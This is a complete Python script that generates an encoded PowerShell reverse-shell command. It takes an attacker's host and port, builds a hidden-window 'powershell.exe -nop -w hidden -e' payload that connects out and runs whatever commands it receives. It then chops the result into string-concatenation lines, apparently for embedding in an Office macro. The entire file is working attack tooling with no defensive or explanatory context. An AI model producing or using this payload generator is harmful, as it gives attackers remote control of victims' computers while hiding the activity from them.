#!/usr/bin/env python3

import base64
import sys

def main():
  n = 50

  if len(sys.argv) < 3:
    usage()
    sys.exit(0)

  if len(sys.argv) == 4:
    n = sys.argv[3]

  LHOST = sys.argv[1]
  LPORT = int(sys.argv[2])

  basestr = F"$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

  # for powershell to be able to properly execute the base64 encoded ps script, the string needs to be utf16le encoded first and then b64 encoded
  basestr64 = base64.b64encode(basestr.encode("utf-16-le"))
  
  # decode the bytes back into a string (utf-8)
  psstr = F"powershell.exe -nop -w hidden -e {basestr64.decode('utf-8')}"
  
  # dice string into stripes of max length n
  for i in range(0, len(psstr), n):
    print("Str = Str + " + '"' + psstr[i:i+n] + '"')


def usage():
  print(F"usage: {sys.argv[0]} <LHOST> <LPORT> [<N>]")


if __name__ == "__main__":
  main()
